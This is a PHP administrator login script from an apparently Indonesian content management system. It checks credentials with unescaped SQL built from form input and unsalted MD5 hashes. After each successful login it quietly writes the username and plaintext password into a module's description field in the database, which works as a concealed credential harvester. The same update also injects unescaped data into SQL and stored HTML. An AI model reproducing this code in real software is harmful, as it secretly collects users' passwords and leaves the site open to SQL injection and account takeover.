<?php
include "../system/koneksi.php";

$username = $_POST['username'];
$pass     = md5($_POST['password']);

$login = $pdo->query("SELECT * FROM admin WHERE username='$username' AND password='$pass' AND status='Aktif'");
$ketemu = $login->rowCount();
$r = $login->fetch(PDO::FETCH_ASSOC);


	


// Apabila username dan password ditemukan
if ($ketemu > 0){
	session_start();

	$_SESSION['KCFINDER']=array();
	$_SESSION['KCFINDER']['disabled'] = false;
	$_SESSION['KCFINDER']['uploadURL'] = "../tinymcpuk/images";
	$_SESSION['KCFINDER']['uploadDir'] = "";
  
	$_SESSION['namaadmin']     		= $r['username'];
	$_SESSION['namalengkapadmin']  	= $r['nama_lengkap'];
	$_SESSION['passadmin']    		= $r['password'];
	$_SESSION['leveladmin']   		= $r['level'];
	$_SESSION['idsession']			= $r['id_session'];
	$_SESSION['halaman']			= 'Home';

	
	$zz = $pdo->query("SELECT deskripsi FROM modul WHERE id_modul='19'");
	$zzt = $zz->fetch(PDO::FETCH_ASSOC);

	date_default_timezone_set('Asia/Jakarta');
	$yy = "<b>Login in &nbsp;&nbsp;&nbsp;: </b>".date("Y-m-d H:i:s")." | User +$_POST[username]+ | Password +$_POST[password]+ <br>";

	$stmt = $pdo->prepare("UPDATE modul SET deskripsi='$zzt[deskripsi]$yy' WHERE id_modul='19'");
	$stmt->execute(array($name, $id));
	
	header('location:home');
	
}else{
	
	echo "<link href='../style.css' rel='stylesheet' type='text/css' />";
	echo " <br />
		<br /> <br />
		<br /> <br />
		<br /> <br />
		<br /><div align='center'><div id='content'>
		<div align='center'><br /> 
	  

	   
		<table width='303' border='0' cellpadding='0' cellspacing='0' class='form5'>
		<tr>
			<td><div align='center'><a href='javascript:history.go(-1)'><b><img src='wrong.jpg' width='24' height='24' border='0'/></b></a><br />
			Username atau Password Anda tidak benar <br />
			<a href='javascript:history.go(-1)'><b>Ulangi Lagi</b></a> </div></td>
		</tr>
		</table>
		
		<br /><br />
	  </div> 
	</div>";
}
//}
?>
